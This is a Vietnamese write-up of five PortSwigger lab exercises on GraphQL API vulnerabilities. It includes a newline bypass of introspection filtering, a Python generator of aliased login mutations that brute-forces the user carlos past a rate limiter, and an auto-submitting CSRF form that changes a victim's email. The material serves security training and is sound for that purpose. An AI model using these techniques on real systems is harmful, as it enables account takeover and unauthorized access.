# [Portswigger] GraphQL API vulnerabilities

Trước tiên cần cài đặt Extension InQL (Extension này yêu cầu Jython => Down file jar bản standalone về rồi add đường dẫn vào trong phần Extender => Option => config Python Environment như sau:

<img width="401" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/35886676-50e8-48d1-96ff-7c7adb16fd58">

***

## 1. Lab: Accessing private GraphQL posts

* Content:
```
The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

For more information on using InQL, see Working with GraphQL in Burp Suite.
```
* Exploit:

Thực hiện truy cập trang web và view trong Burp History => Phát hiện request gọi đến GraphQL như sau `POST /graphql/v1` :

<img width="624" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/6be89567-9496-43e0-b13d-f085cf8b2160">

Tuy nhiên phát hiện thấy thiếu phần `"id": 3`

Copy link URL paste vào InQL Scanner => Ta thấy Scanner cho ta thông tin của 2 Query là "getAllBlogPosts" và "getBlogPost"

<img width="514" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/28d259b3-31ab-4d64-8540-53b18718fb34">

Chuột phải vào query "getBlogPost" và chọn Send to Repeater. Trong Repeater, chỉnh id thành 3:

<img width="625" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/388e71c9-eb59-4111-abec-4b6b72230cbc">

=> Get được nội dung của Post ID = 3 kèm postPassword. => LAB SOLVED!

***

## 2. Lab: Accidental exposure of private GraphQL fields

* Content:
```
The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username carlos.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

For more information on using InQL, see Working with GraphQL in Burp Suite.
```
* Exploit:

Thực hiện truy cập vào tính năng `My Account` => Bắt request trên Burp History và sử dụng InQL Scanner:

<img width="524" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c3b3299c-8f37-4ace-b072-8d9d8e9f4d94">

Phát hiện 1 query tên là "getUser" => Sử dụng Query này với id = 1 => PHát hiện user/pass của administrator

<img width="551" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/836f35f0-dd74-4196-9621-a75f79a28555">

LAB SOLVED!

<img width="578" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9a0103c0-71bf-483a-8ecd-0b77d4bdbd57">

***

## 3. Lab: Finding a hidden GraphQL endpoint

* Content:
```
The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete carlos.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

For more information on using InQL, see Working with GraphQL in Burp Suite.
```
* Exploit:

Thực hiênj truy cập vào link `/api` phát hiện ra link này có chứa GraphAPI, tuy nhiên đang bị báo là thiếu dữ liệu Query truyền vào.

<img width="634" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c9017519-a8df-4f1c-8f45-61d916f09278">

Truyền vào biến query giá trị payload sau để test 

```
{
        "query": "{__schema{queryType{name}}}"
    }
```

=> URL Encode trước khi truyền đi: 

<img width="628" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/170e37ce-044b-4bbb-90da-e79cb210ea75">

Response báo `__schema or __type` không được chấp nhận => Bypass bằng cách thêm 1 ký tự xuống dòng phía sau `__schema`.

Tiếp theo sử dụng payload như hướng dẫn của porswigger như sau để đọc full introspection:

```
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #Often needs to be deleted to run query
        onFragment   #Often needs to be deleted to run query
        onField      #Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

Tuy nhiên kết quả trả về như sau:

<img width="624" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/404c17f8-eaba-4f9e-88e7-94e3e03ce008">

Vẫn tiếp tục cần bypass bằng ký tự newline => Gửi lại request

<img width="624" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/8578b54f-49c9-44b2-8b03-c7be69beaebb">

Lần này response báo có error ở dòng onOperation, onFragment, onField => Thực hiện xóa 3 dòng này đi và gửi lại:

<img width="628" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2e36e697-52df-4fa6-ba5d-2e033336cbf2">

=> Kết quả đã thành công, đã lấy được full data introspection.

Đến bước này ta thực hiện copy toàn bộ Response body và Save vào file với định dạng json. Ở đây mình save vào "1.json". => Tiếp theo load file này vào trong tab "InQL Scanner":

Kết quả cho ra một query và một mutation như sau:

<img width="368" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/fbda854d-5500-4776-bba6-501453269625">

<img width="438" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/fd11f12a-f5a2-4063-bc2e-a772989a4921">

=> Sử dụng query `getUser` để tìm user `carlos` và dùng mutation `deleteOrganizationUser` để xóa user này:

<img width="628" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d218cfba-fb20-4081-bee5-13e90bb4726e">

<img width="623" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/94b46f7a-d6b2-470e-b9b5-e485c261f665">

LAB SOLVED!

<img width="589" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/48870f4e-47ac-491c-a94c-e7f59902d56c">

***

## 4. Lab: Bypassing GraphQL brute force protections

* Content:
```
The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater.

For more information on using InQL, see Working with GraphQL in Burp Suite.
```
* Exploit:

Truy cập vào chức năng login và thử đăng nhập bằng user/pass bất kỳ => Phát hiện link GraphAPI `POST /graphql/v1`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/ef897054-22ba-498b-af7e-1175d116c095)

Copy URL cho vào InQL Scanner => Phát hiện mutaion login như sau:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5eb8a3f6-263d-4901-a8b4-faafd41b5dee)

Query Payload:

```
mutation {
	login(input:{password: "code*", username: "code*"}) {
		token
		success
	}
}
```

=> Ta cần sinh payload dạng như sau (Dùng Alias để hạn chế Rate limit - Chỉ 1 HTTP request duy nhất để bruteforce nhiều password):

```
    mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...

          bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }
```

Ta sử dụng đoạn code sinh payload như sau để gen payload với toàn bộ password lưu sẵn trong file `pass.txt`: 

```python
input1 = "(input:{password: "

input2 = """\\", username: \\"carlos\\"}) {
		token
		success
	}"""

#print(input)
i=0
with open('pass.txt') as f:
    for line in f:
        i+=1
        output = "bruteForce" + str(i) + ":login" + input1 + "\\\"" + line.strip() + input2
        print(output)
```

=> Dùng payload sinh được cho vào Request => Tìm ra password là `buster`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/68772c5b-d96c-4c55-90b4-9b2ceff78c40)

Đăng nhập vào hệ thống bằng user `carlos:buster` => LAB SOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d306f1f3-845e-483b-8cd7-6ed66dfc2c47)

***

## 5. Lab: Performing CSRF exploits over GraphQL

* Content:
```
The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of x-www-form-urlencoded and is therefore vulnerable to cross-site request forgery (CSRF) attacks.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater.

For more information on using InQL, see Working with GraphQL in Burp Suite.
```
* Exploit:

Thực hiện login vào lab bằng user được cung cấp `wiener:peter` => Tiến hành Change địa chỉ Email.

Bắt traffic qua BurpSuite thì thấy tính năng Change Email được thực hiện qua GraphQL API: `POST /graphql/v1`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d9df5306-edb9-481e-b224-c9ac0d64d165)

Do tấn công CSRF sẽ không thực hiện được với `Content-Type: application/json` nên ta phải tìm cách chuyển request trên thành dạng `Content-Type: application/x-www-form-urlencoded`

=> Gửi request trên sang tab Repeater và chọn `Change Request Method` 2 lần POST -> GET -> POST. Khi này request convert sang hiện không còn lưu lại giá trị parametter value => Chúng ta cần bổ sung thêm phần này.

Ngoài ra, copy link URL của request `POST /graphql/v1` cho sang tab InQL Scanner => Ta thu được query `changeEmail` như sau:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/182ef883-eedd-4ce7-9938-f92b325f8adb)

=> Copy query thu được (fill vào địa chỉ email mà ta muốn victim change sang) và chuyển sang dạng URL Encode.

```
mutation {
	changeEmail(input:{email: "123456mail.com"}) {
		email
	}
}
```

URL Encode: `%6d%75%74%61%74%69%6f%6e%20%7b%0a%09%63%68%61%6e%67%65%45%6d%61%69%6c%28%69%6e%70%75%74%3a%7b%65%6d%61%69%6c%3a%20%22%31%32%33%34%35%36%6d%61%69%6c%2e%63%6f%6d%22%7d%29%20%7b%0a%09%09%65%6d%61%69%6c%0a%09%7d%0a%7d`

Ghép query trên vào Request POST dạng `Content-Type: application/x-www-form-urlencoded` như sau:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/8c1dba67-26c9-4358-a74a-b8e59dac47dd)

Sử dụng tính năng Generate CSRF PoC

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4e58abd0-3224-4886-beec-c210fc5c4094)

Chỉnh sửa thêm event cho button auto submit khi được load => Cuối cùng Payload của chúng ta submit lên Exploit Server như sau:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body onload="document.ndkhai.submit()">
  <script>history.pushState('', '', '/')</script>
    <form action="https://0af7007204fa292282e11501006c005d.web-security-academy.net/graphql/v1" method="POST" name="ndkhai">
      <input type="hidden" name="query" value="mutation&#32;&#123;&#10;&#9;changeEmail&#40;input&#58;&#123;email&#58;&#32;&quot;123456mail&#46;com&quot;&#125;&#41;&#32;&#123;&#10;&#9;&#9;email&#10;&#9;&#125;&#10;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

Deliver Exploit to victim => LAB RESOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/0810722d-75c5-4bf8-933c-4b94ea7ceaf5)
